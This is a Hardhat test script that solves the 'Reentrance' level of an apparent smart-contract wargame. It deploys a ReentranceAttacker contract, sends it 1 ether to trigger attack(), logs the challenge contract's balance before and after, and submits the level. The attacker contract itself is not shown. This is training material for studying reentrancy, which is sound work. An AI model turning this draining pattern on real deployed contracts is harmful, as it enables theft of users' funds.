import { expect } from "chai";
import { BigNumber, Contract, Signer } from "ethers";
import { ethers } from "hardhat";
import { createChallenge, submitLevel } from "./utils";

let eoa: Signer;
let challenge: Contract; // challenge contract
let attacker: Contract | undefined;

before(async () => {
  accounts = await ethers.getSigners();
  [eoa] = accounts;
  const challengeFactory = await ethers.getContractFactory("Reentrance");
  const challengeAddress = await createChallenge(
    "0x848fb2124071146990c7abE8511f851C7f527aF4",
    ethers.utils.parseUnits("1", "ether")
  );
  challenge = await challengeFactory.attach(challengeAddress);

  const attackerFactory = await ethers.getContractFactory("ReentranceAttacker");
  attacker = await attackerFactory.deploy(challenge.address);
});

it("solves the challenge", async () => {
  console.log(
    "Challenge balance",
    (await challenge.provider.getBalance(challenge.address)).toString()
  );
  tx = await attacker.attack({
    value: ethers.utils.parseUnits("1", "ether"),
    gasLimit: BigNumber.from("200000")
  });
  await tx.wait();
  console.log(
    "Challenge balance",
    (await challenge.provider.getBalance(challenge.address)).toString()
  );
});

after(async () => {
  expect(await submitLevel(challenge.address), "level not solved").to.be.true;
});
